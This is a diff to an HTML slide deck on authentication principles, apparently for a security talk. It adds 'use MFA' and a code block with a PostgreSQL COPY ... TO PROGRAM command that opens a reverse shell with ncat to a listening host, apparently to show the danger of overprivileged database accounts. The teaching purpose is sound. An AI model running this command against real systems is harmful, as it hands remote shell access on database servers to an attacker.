@@ -237,6 +237,7 @@
 				<section>
 					<h2>Authentication principles</h2>
 					<ul>
+						<li>use MFA</li>
 						<li>Automatically generate hard to guess credentials</li>
 						<ul>
 							<li>e.g. pwgen 32 1</li>
@@ -246,6 +247,9 @@
 							<li>automatically set least privilege</li>
 							<li>that means other than DBA on your database!</li>
 						</ul>
+						<pre><code data-trim contenteditable>
+COPY (SELECT 'id') TO PROGRAM 'ncat -e /bin/sh http://mylistening.host.nc  5555' DELIMITER ',';
+						</code></pre>
 					</ul>
 				</section>
 
